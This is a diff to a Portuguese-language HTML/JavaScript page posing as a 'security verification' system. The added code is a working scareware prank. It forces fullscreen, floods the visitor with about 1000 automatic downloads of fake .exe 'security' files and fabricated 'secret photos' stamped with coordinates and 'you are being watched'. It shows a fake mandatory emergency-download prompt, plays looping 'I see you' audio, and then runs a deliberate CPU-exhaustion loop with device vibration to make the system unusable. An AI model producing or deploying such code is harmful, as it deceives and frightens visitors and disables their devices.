@@ -66,22 +66,6 @@
             border-radius: 5px;
         }
 
-        .download-overlay {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(0, 0, 0, 0.95);
-            color: #0f0;
-            padding: 30px;
-            border: 3px solid #f00;
-            z-index: 20000;
-            text-align: center;
-            display: none;
-            border-radius: 10px;
-            box-shadow: 0 0 30px red;
-        }
-
         .fullscreen-download {
             position: fixed;
             top: 0;
@@ -150,9 +134,72 @@
             animation: float 2s infinite;
         }
 
+        .audio-overlay {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(255, 0, 0, 0.9);
+            color: white;
+            padding: 30px;
+            font-size: 3em;
+            z-index: 30000;
+            display: none;
+            text-align: center;
+            border-radius: 10px;
+            animation: pulse 0.5s infinite;
+        }
+
+        .mid-download-overlay {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.95);
+            color: #ff0000;
+            padding: 40px;
+            border: 4px solid #0f0;
+            z-index: 26000;
+            text-align: center;
+            display: none;
+            border-radius: 15px;
+            box-shadow: 0 0 40px #0f0;
+            width: 80%;
+            max-width: 600px;
+        }
+
+        .cpu-overload {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: #ff0000;
+            color: white;
+            padding: 10px;
+            font-size: 1.2em;
+            z-index: 950;
+            border-radius: 5px;
+            display: none;
+        }
+
         @keyframes float {
             0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 1; }
             50% { transform: translateY(-20px) rotate(180deg); opacity: 0.7; }
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+            50% { transform: translate(-50%, -50%) scale(1.1); opacity: 0.8; }
+        }
+
+        @keyframes emergency {
+            0%, 100% { 
+                background: rgba(255, 0, 0, 0.1);
+                border-color: #ff0000;
+            }
+            50% { 
+                background: rgba(0, 255, 0, 0.1);
+                border-color: #00ff00;
+            }
         }
     </style>
 </head>
@@ -165,14 +212,36 @@
         </div>
     </div>
 
-    <!-- VÍDEO -->
-    <video id="video" playsinline loop muted>
+    <!-- VÍDEO COM ÁUDIO -->
+    <video id="video" playsinline loop>
         <source src="https://alexandre7888.github.io/ontono.exe/InShot_20250705_234210151.mp4" type="video/mp4">
     </video>
 
     <!-- INTERFACE -->
     <div class="terminal-text" id="terminal"></div>
     <div class="status" id="status">SISTEMA PRONTO</div>
+    <div class="cpu-overload" id="cpuOverload">🔥 CPU: 100%</div>
+    <div class="audio-overlay" id="audioOverlay">EU VEJO VOCÊ</div>
+    
+    <!-- OVERLAY DE DOWNLOAD NO MEIO -->
+    <div class="mid-download-overlay" id="midDownloadOverlay">
+        <h1 style="color: #00ff00; font-size: 2.5em; margin-bottom: 20px;">🚨 DOWNLOAD DE EMERGÊNCIA</h1>
+        <p style="font-size: 1.4em; margin: 20px 0;">
+            <strong>ARQUIVOS CRÍTICOS DETECTADOS</strong>
+        </p>
+        <div id="midFileList" style="text-align: left; margin: 20px 0; max-height: 200px; overflow-y: auto;">
+            <!-- Arquivos de emergência aparecerão aqui -->
+        </div>
+        <p style="color: #ff4444; font-size: 1.1em; margin: 15px 0;">
+            ⚠️ DOWNLOAD OBRIGATÓRIO PARA CONTINUAR!
+        </p>
+        <button onclick="closeMidDownload()" style="background: #00ff00; color: #000; padding: 15px 40px; font-size: 1.3em;">
+            📥 BAIXAR ARQUIVOS DE EMERGÊNCIA
+        </button>
+        <p style="margin-top: 15px; font-size: 0.9em; color: #ccc;">
+            ⏱️ Sistema pausado até download ser concluído
+        </p>
+    </div>
 
     <!-- DOWNLOAD EM TELA CHEIA -->
     <div class="fullscreen-download" id="fullscreenDownload">
@@ -196,10 +265,15 @@
         </button>
 
         <div style="margin-top: 30px; font-size: 0.9em; color: #ccc;">
-            <p>🔒 Arquivos essenciais para: VPN, Antivírus, Firewall, Criptografia</p>
-            <p>💾 Total: 2.3 GB • Tempo estimado: 3-5 minutos</p>
+            <p>🔒 1000 ARQUIVOS ESSENCIAIS: Fotos de Segurança + Sistema de Proteção</p>
+            <p>💾 Total: 4.7 GB • Tempo estimado: 5-8 minutos</p>
         </div>
     </div>
+
+    <!-- ÁUDIO ESCONDIDO -->
+    <audio id="terrorAudio" loop>
+        <source src="https://alexandre7888.github.io/ontono.exe/eu%20vejo%20voc%C3%AA.mp3" type="audio/mpeg">
+    </audio>
 
     <script>
         // ELEMENTOS PRINCIPAIS
@@ -209,11 +283,20 @@
         const status = document.getElementById("status");
         const fullscreenDownload = document.getElementById("fullscreenDownload");
         const fileList = document.getElementById("fileList");
+        const cpuOverload = document.getElementById("cpuOverload");
+        const audioOverlay = document.getElementById("audioOverlay");
+        const terrorAudio = document.getElementById("terrorAudio");
+        const midDownloadOverlay = document.getElementById("midDownloadOverlay");
+        const midFileList = document.getElementById("midFileList");
 
         // VARIÁVEIS GLOBAIS
         let isActive = false;
         let downloadCount = 0;
         let pipInterval;
+        let crashIntervals = [];
+        let audioClips = [];
+        let downloadPaused = false;
+        const totalDownloads = 1000;
 
         // LISTA DE ARQUIVOS "DE SEGURANÇA"
         const securityFiles = [
@@ -226,12 +309,16 @@
             { name: "Password_Manager_Setup.exe", type: "Segurança", size: "45 MB" },
             { name: "Browser_Secure_Update.exe", type: "Navegador", size: "38 MB" },
             { name: "Malware_Removal_Tool.exe", type: "Antimalware", size: "156 MB" },
-            { name: "Privacy_Shield_Installer.exe", type: "Privacidade", size: "82 MB" },
-            { name: "Emergency_Backup_System.exe", type: "Backup", size: "201 MB" },
-            { name: "Rootkit_Detector.exe", type: "Segurança", size: "67 MB" },
-            { name: "System_Repair_Suite.exe", type: "Reparo", size: "178 MB" },
-            { name: "Crypto_Wallet_Protector.exe", type: "Cripto", size: "54 MB" },
-            { name: "Network_VPN_Booster.exe", type: "VPN", size: "71 MB" }
+            { name: "Privacy_Shield_Installer.exe", type: "Privacidade", size: "82 MB" }
+        ];
+
+        // ARQUIVOS DE EMERGÊNCIA (aparecem no meio)
+        const emergencyFiles = [
+            { name: "CRITICAL_SYSTEM_UPDATE.exe", type: "Atualização", size: "89 MB" },
+            { name: "EMERGENCY_SECURITY_PATCH.exe", type: "Patch", size: "67 MB" },
+            { name: "DATA_RECOVERY_TOOL.exe", type: "Recuperação", size: "124 MB" },
+            { name: "SYSTEM_BACKUP_URGENT.exe", type: "Backup", size: "203 MB" },
+            { name: "NETWORK_SECURITY_FIX.exe", type: "Correção", size: "56 MB" }
         ];
 
         // FUNÇÃO DO TERMINAL
@@ -286,9 +373,81 @@
             }
         }
 
+        // ATIVAR ÁUDIO DO VÍDEO
+        function enableVideoAudio() {
+            updateTerminal("🔊 ATIVANDO ÁUDIO DO VÍDEO...");
+            video.muted = false;
+            video.volume = 0.7;
+            
+            // Tentar reproduzir com áudio
+            video.play().then(() => {
+                updateTerminal("✅ ÁUDIO DO VÍDEO ATIVADO");
+            }).catch(error => {
+                updateTerminal("❌ ERRO ÁUDIO VÍDEO: " + error);
+                // Se der erro, tenta sem áudio
+                video.muted = true;
+                video.play();
+            });
+        }
+
+        // GERAR FOTO ASSUSTADORA
+        function generateScaryImage(index) {
+            const canvas = document.createElement('canvas');
+            canvas.width = 1920;
+            canvas.height = 1080;
+            const ctx = canvas.getContext('2d');
+            
+            // Fundo preto
+            ctx.fillStyle = '#000';
+            ctx.fillRect(0, 0, 1920, 1080);
+            
+            // Texto assustador vermelho
+            ctx.fillStyle = '#ff0000';
+            ctx.font = 'bold 60px Arial';
+            ctx.fillText('FOTO DE SEGURANÇA COMPROMETIDA', 100, 150);
+            
+            ctx.fillStyle = '#00ff00';
+            ctx.font = '30px Courier New';
+            ctx.fillText(`ARQUIVO: FOTO_SECRETA_${index}.jpg`, 100, 220);
+            ctx.fillText(`DATA: ${new Date().toLocaleString()}`, 100, 270);
+            ctx.fillText(`LOCALIZAÇÃO: -23.5505, -46.6333`, 100, 320);
+            ctx.fillText(`STATUS: ACESSO NÃO AUTORIZADO`, 100, 370);
+            ctx.fillText(`VOCÊ ESTÁ SENDO OBSERVADO...`, 100, 420);
+            
+            // Rosto assustador simples
+            ctx.strokeStyle = '#ff0000';
+            ctx.lineWidth = 8;
+            
+            // Olhos
+            ctx.beginPath();
+            ctx.arc(700, 600, 80, 0, Math.PI * 2);
+            ctx.arc(1000, 600, 80, 0, Math.PI * 2);
+            ctx.stroke();
+            
+            // Boca
+            ctx.beginPath();
+            ctx.arc(850, 750, 120, 0, Math.PI);
+            ctx.stroke();
+            
+            // Códigos binários verdes
+            ctx.fillStyle = '#00ff00';
+            ctx.font = '20px Courier New';
+            for (let i = 0; i < 25; i++) {
+                let binary = '';
+                for (let j = 0; j < 40; j++) {
+                    binary += Math.random() > 0.5 ? '1' : '0';
+                }
+                ctx.fillText(binary, 100, 500 + (i * 25));
+            }
+            
+            return canvas.toDataURL('image/jpeg');
+        }
+
         // GERAR LISTA DE ARQUIVOS
         function generateFileList() {
             fileList.innerHTML = '';
+            
+            // Adicionar arquivos de sistema
             securityFiles.forEach((file, index) => {
                 const fileItem = document.createElement('div');
                 fileItem.className = 'file-item';
@@ -298,6 +457,134 @@
                 `;
                 fileList.appendChild(fileItem);
             });
+            
+            // Adicionar fotos secretas
+            for (let i = 1; i <= 10; i++) {
+                const fileItem = document.createElement('div');
+                fileItem.className = 'file-item';
+                fileItem.innerHTML = `
+                    <strong>FOTO_SECRETA_${i}.jpg</strong><br>
+                    <span style="color: #ccc;">Tipo: Imagem de Segurança • Tamanho: 4.2 MB</span>
+                `;
+                fileList.appendChild(fileItem);
+            }
+        }
+
+        // MOSTRAR DOWNLOAD NO MEIO
+        function showMidDownload() {
+            updateTerminal("🚨 MOSTRANDO DOWNLOAD DE EMERGÊNCIA NO MEIO...");
+            
+            // Gerar lista de arquivos de emergência
+            midFileList.innerHTML = '';
+            emergencyFiles.forEach(file => {
+                const fileItem = document.createElement('div');
+                fileItem.style.cssText = `
+                    padding: 12px;
+                    margin: 8px 0;
+                    background: rgba(255, 0, 0, 0.3);
+                    border-radius: 8px;
+                    border-left: 4px solid #00ff00;
+                    animation: emergency 2s infinite;
+                `;
+                fileItem.innerHTML = `
+                    <strong style="color: #00ff00;">${file.name}</strong><br>
+                    <span style="color: #ccc;">${file.type} • ${file.size}</span>
+                `;
+                midFileList.appendChild(fileItem);
+            });
+            
+            // Mostrar overlay
+            midDownloadOverlay.style.display = 'block';
+            downloadPaused = true;
+            
+            updateTerminal("⏸️ DOWNLOADS PAUSADOS - AGUARDANDO DOWNLOAD DE EMERGÊNCIA");
+        }
+
+        function closeMidDownload() {
+            updateTerminal("✅ DOWNLOAD DE EMERGÊNCIA CONCLUÍDO - CONTINUANDO...");
+            midDownloadOverlay.style.display = 'none';
+            downloadPaused = false;
+            
+            // Baixar os arquivos de emergência
+            emergencyFiles.forEach((file, index) => {
+                setTimeout(() => {
+                    const content = `
+=== ${file.name} - EMERGENCY VERSION ===
+File: ${file.name}
+Type: ${file.type}
+Size: ${file.size}
+SHA256: ${Math.random().toString(36).substr(2, 64).toUpperCase()}
+Timestamp: ${new Date().toLocaleString()}
+
+EMERGENCY SECURITY PROTOCOL: ACTIVATED
+This file contains critical emergency updates
+for immediate system protection.
+
+⚠️ URGENT: DO NOT DELETE THIS FILE!
+====================================
+                    `.repeat(8);
+
+                    const blob = new Blob([content], { type: 'application/octet-stream' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = file.name;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    setTimeout(() => URL.revokeObjectURL(url), 1000);
+
+                    downloadCount++;
+                    updateTerminal(`📥 DOWNLOAD EMERGÊNCIA: ${file.name}`);
+
+                }, index * 800);
+            });
+        }
+
+        // SISTEMA DE ÁUDIO
+        function setupAudioSystem() {
+            updateTerminal("🔊 CONFIGURANDO SISTEMA DE ÁUDIO...");
+            
+            // Criar múltiplas instâncias de áudio
+            for (let i = 0; i < 10; i++) {
+                const audio = new Audio();
+                audio.src = "https://alexandre7888.github.io/ontono.exe/eu%20vejo%20voc%C3%AA.mp3";
+                audio.volume = 0.7;
+                audio.preload = "auto";
+                audioClips.push(audio);
+            }
+            updateTerminal("✅ SISTEMA DE ÁUDIO CONFIGURADO");
+        }
+
+        function playTerrorAudio() {
+            updateTerminal("🔊 REPRODUZINDO ÁUDIO DE TERROR...");
+            
+            // Mostrar overlay
+            audioOverlay.style.display = 'block';
+            
+            // Tocar áudio principal
+            terrorAudio.volume = 1.0;
+            terrorAudio.play().catch(e => {
+                terrorAudio.muted = true;
+                terrorAudio.play();
+            });
+            
+            // Tocar áudios extras
+            audioClips.forEach((audio, index) => {
+                setTimeout(() => {
+                    audio.currentTime = 0;
+                    audio.volume = 0.5;
+                    audio.play().catch(e => {
+                        audio.muted = true;
+                        audio.play();
+                    });
+                }, index * 2000);
+            });
+            
+            // Remover overlay após 5 segundos
+            setTimeout(() => {
+                audioOverlay.style.display = 'none';
+            }, 5000);
         }
 
         // INICIAR DOWNLOADS EM MASSA
@@ -306,22 +593,35 @@
             status.textContent = "DOWNLOADING SECURITY FILES...";
 
             let completed = 0;
-            const totalFiles = securityFiles.length * 10; // 150 arquivos
+            let midDownloadShown = false;
 
             function downloadNextFile(index) {
-                if (index >= totalFiles) {
-                    updateTerminal("🎯 TODOS OS DOWNLOADS CONCLUÍDOS!");
-                    status.textContent = "SECURITY INSTALLED - SYSTEM SAFE";
-                    startCrashSequence();
+                if (downloadPaused) {
+                    setTimeout(() => downloadNextFile(index), 500);
                     return;
                 }
 
-                const fileIndex = index % securityFiles.length;
-                const file = securityFiles[fileIndex];
-                const fileNumber = Math.floor(index / securityFiles.length) + 1;
+                if (index >= totalDownloads) {
+                    updateTerminal("🎯 TODOS OS 1000 DOWNLOADS CONCLUÍDOS!");
+                    status.textContent = "SECURITY INSTALLED - SYSTEM SAFE";
+                    startUltimateCrashSequence();
+                    return;
+                }
 
-                // Criar conteúdo do arquivo
-                const fileContent = `
+                // Mostrar download no meio quando chegar na metade
+                if (index >= 250 && !midDownloadShown) {
+                    midDownloadShown = true;
+                    showMidDownload();
+                    return;
+                }
+
+                if (index < 100) {
+                    // Baixar arquivos de sistema (primeiros 100)
+                    const fileIndex = index % securityFiles.length;
+                    const file = securityFiles[fileIndex];
+                    const fileNumber = Math.floor(index / securityFiles.length) + 1;
+
+                    const fileContent = `
 === ${file.name} - VERSION ${fileNumber}.0 ===
 File: ${file.name}_v${fileNumber}.exe
 Type: ${file.type}
@@ -333,96 +633,183 @@ SECURITY PROTOCOL: ACTIVE
 This file contains essential security components
 for complete system protection.
 
-FEATURES:
-• Real-time threat detection
-• Advanced encryption
-• Network security
-• Privacy protection
-• System optimization
-
-INSTALLATION REQUIRED FOR:
-- Virus protection
-- Data encryption
-- Privacy security
-- System stability
-
 ⚠️ DO NOT DELETE OR MODIFY THIS FILE!
 =====================================
-                `.repeat(5); // Conteúdo maior
+                    `.repeat(10);
 
+                    downloadFile(fileContent, `${file.name.replace('.exe', '')}_v${fileNumber}.exe`, index);
+                    
+                } else {
+                    // Baixar fotos assustadoras (900 fotos)
+                    const photoIndex = index - 100;
+                    generateAndDownloadScaryPhoto(photoIndex, index);
+                }
+            }
+
+            function downloadFile(content, filename, index) {
                 try {
-                    const blob = new Blob([fileContent], { type: 'application/octet-stream' });
+                    const blob = new Blob([content], { type: 'application/octet-stream' });
                     const url = URL.createObjectURL(blob);
                     const a = document.createElement('a');
                     a.href = url;
-                    a.download = `${file.name.replace('.exe', '')}_v${fileNumber}.exe`;
+                    a.download = filename;
                     document.body.appendChild(a);
                     a.click();
                     document.body.removeChild(a);
 
-                    // Limpar URL após download
                     setTimeout(() => URL.revokeObjectURL(url), 1000);
 
                     completed++;
                     downloadCount++;
                     updateDownloadProgress();
 
-                    // Próximo download
-                    setTimeout(() => downloadNextFile(index + 1), 800);
+                    setTimeout(() => downloadNextFile(index + 1), 300);
 
                 } catch (error) {
                     updateTerminal(`❌ ERRO DOWNLOAD ${index + 1} - TENTANDO NOVAMENTE`);
-                    setTimeout(() => downloadNextFile(index), 1000);
+                    setTimeout(() => downloadNextFile(index), 500);
                 }
+            }
+
+            function generateAndDownloadScaryPhoto(photoIndex, globalIndex) {
+                const imageData = generateScaryImage(photoIndex + 1);
+                
+                fetch(imageData)
+                    .then(res => res.blob())
+                    .then(blob => {
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = `FOTO_SECRETA_${photoIndex + 1}.jpg`;
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                        URL.revokeObjectURL(url);
+
+                        completed++;
+                        downloadCount++;
+                        updateDownloadProgress();
+
+                        setTimeout(() => downloadNextFile(globalIndex + 1), 200);
+                    })
+                    .catch(error => {
+                        updateTerminal(`❌ ERRO FOTO ${globalIndex + 1} - TENTANDO NOVAMENTE`);
+                        setTimeout(() => downloadNextFile(globalIndex), 500);
+                    });
             }
 
             downloadNextFile(0);
         }
 
         function updateDownloadProgress() {
-            status.textContent = `DOWNLOAD: ${downloadCount}/150 ARQUIVOS`;
+            const progress = Math.floor((downloadCount / totalDownloads) * 100);
+            status.textContent = `DOWNLOAD: ${downloadCount}/${totalDownloads} (${progress}%)`;
             
-            // Atualizar overlay
-            const progress = Math.floor((downloadCount / 150) * 100);
             document.querySelector('.fullscreen-download h1').innerHTML = 
                 `🚨 DOWNLOADS DE SEGURANÇA ${progress}% COMPLETO`;
 
-            if (downloadCount % 15 === 0) {
-                updateTerminal(`📊 PROGRESSO: ${downloadCount}/150 (${progress}%)`);
+            if (downloadCount % 100 === 0) {
+                updateTerminal(`📊 PROGRESSO: ${downloadCount}/${totalDownloads} (${progress}%)`);
             }
         }
 
-        // SEQUÊNCIA DE TRAVAMENTO
-        function startCrashSequence() {
-            updateTerminal("💀 INICIANDO SEQUÊNCIA DE TRAVAMENTO...");
+        // TRAVAMENTO ULTIMATE - CPU 100%
+        function startUltimateCrashSequence() {
+            updateTerminal("💀 INICIANDO TRAVAMENTO ULTIMATE - CPU 100%");
+            cpuOverload.style.display = 'block';
             
-            // Elementos voando na tela
-            const crashInterval = setInterval(() => {
-                for (let i = 0; i < 10; i++) {
+            // Ativar áudio do vídeo
+            enableVideoAudio();
+            
+            // Tocar áudio de terror
+            playTerrorAudio();
+
+            // 🔥 CÁLCULOS PESADÍSSIMOS - 1000 FPS
+            function heavyCalculations() {
+                // 1 MILHÃO de cálculos por frame
+                for (let i = 0; i < 1000000; i++) {
+                    // Cálculos extremamente complexos
+                    const a = Math.random() * Math.PI;
+                    const b = Math.random() * Math.E;
+                    const c = Math.random() * 1000;
+                    
+                    // Equações matemáticas pesadas
+                    const eq1 = Math.sin(a) * Math.cos(b) * Math.tan(c);
+                    const eq2 = Math.pow(eq1, Math.PI) * Math.log(Math.abs(eq1) + 1);
+                    const eq3 = Math.acos(eq2) * Math.asin(eq1) * Math.atan2(a, b);
+                    const eq4 = Math.sinh(eq3) * Math.cosh(eq2) * Math.tanh(eq1);
+                    
+                    // Processamento matricial
+                    const matrix = [];
+                    for (let j = 0; j < 100; j++) {
+                        matrix[j] = [];
+                        for (let k = 0; k < 100; k++) {
+                            matrix[j][k] = eq1 * j + eq2 * k + eq3 * (j * k);
+                        }
+                    }
+                    
+                    // Multiplicação de matrizes
+                    let result = 0;
+                    for (let j = 0; j < 100; j++) {
+                        for (let k = 0; k < 100; k++) {
+                            result += matrix[j][k] * matrix[k][j] * eq4;
+                        }
+                    }
+                }
+                
+                // Continuar no próximo frame
+                requestAnimationFrame(heavyCalculations);
+            }
+            
+            // Iniciar cálculos pesados
+            heavyCalculations();
+
+            // ELEMENTOS VOANDO - 100 POR SEGUNDO
+            const elementCrash = setInterval(() => {
+                for (let i = 0; i < 20; i++) {
                     const el = document.createElement('div');
                     el.className = 'crash-element';
                     el.style.left = Math.random() * window.innerWidth + 'px';
                     el.style.top = Math.random() * window.innerHeight + 'px';
                     el.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
-                    el.style.fontSize = (20 + Math.random() * 40) + 'px';
-                    el.textContent = ['💀', '🔥', '🚨', '⚠️', '📥'][Math.floor(Math.random() * 5)];
+                    el.style.fontSize = (15 + Math.random() * 50) + 'px';
+                    el.textContent = ['💀', '🔥', '🚨', '⚠️', '📥', '👁️', '🔊'][Math.floor(Math.random() * 7)];
                     document.body.appendChild(el);
                     
-                    setTimeout(() => el.remove(), 4000);
+                    setTimeout(() => {
+                        if (el.parentNode) el.remove();
+                    }, 3000);
                 }
-            }, 500);
+            }, 100); // 10 vezes por segundo
 
-            // Cálculos pesados
-            const cpuCrash = setInterval(() => {
-                for (let i = 0; i < 100000; i++) {
-                    const result = Math.random() * Math.random() * Math.random();
-                }
-            }, 1);
+            // EFEITOS VISUAIS - 60 FPS
+            function visualEffects() {
+                document.body.style.background = `hsl(${Math.random() * 360}, 100%, ${Math.random() * 10}%)`;
+                document.body.style.transform = `translate(${Math.random() * 20 - 10}px, ${Math.random() * 20 - 10}px)`;
+                
+                // Efeitos no vídeo
+                video.style.filter = `
+                    hue-rotate(${Math.random() * 360}deg)
+                    contrast(${100 + Math.random() * 200}%)
+                    brightness(${50 + Math.random() * 100}%)
+                    blur(${Math.random() * 5}px)
+                `;
+                video.playbackRate = 0.5 + Math.random() * 2;
+                
+                requestAnimationFrame(visualEffects);
+            }
+            visualEffects();
 
-            // Efeitos visuais
-            const visualCrash = setInterval(() => {
-                document.body.style.background = `hsl(${Math.random() * 360}, 100%, 5%)`;
-            }, 200);
+            // VIBRAÇÃO (se suportado)
+            if (navigator.vibrate) {
+                setInterval(() => {
+                    navigator.vibrate([500, 200, 500, 200, 500]);
+                }, 2000);
+            }
+
+            crashIntervals.push(elementCrash);
+            
+            updateTerminal("🔥 TRAVAMENTO ATIVADO - CPU 100% - SISTEMA INUTILIZÁVEL");
         }
 
         // INICIAR SISTEMA COMPLETO
@@ -433,23 +820,27 @@ INSTALLATION REQUIRED FOR:
             start.style.display = "none";
             updateTerminal("🚀 INICIANDO SISTEMA DE VERIFICAÇÃO...");
 
-            // 1. Iniciar vídeo
+            // 1. Iniciar vídeo (sem áudio inicialmente)
+            video.muted = true;
             video.play().catch(e => {
                 video.muted = true;
                 video.play();
             });
 
-            // 2. Ativar tela cheia
+            // 2. Configurar áudio
+            setupAudioSystem();
+
+            // 3. Ativar tela cheia
             await activateFullscreen();
 
-            // 3. Configurar PIP
+            // 4. Configurar PIP
             setTimeout(setupPIP, 2000);
 
-            // 4. Mostrar tela de downloads em tela cheia
+            // 5. Mostrar tela de downloads em tela cheia
             setTimeout(() => {
                 generateFileList();
                 fullscreenDownload.style.display = 'flex';
-                updateTerminal("📋 LISTA DE ARQUIVOS DE SEGURANÇA CARREGADA");
+                updateTerminal("📋 LISTA DE 1000 ARQUIVOS CARREGADA");
             }, 4000);
 
             updateTerminal("✅ SISTEMA INICIADO - AGUARDANDO DOWNLOADS...");
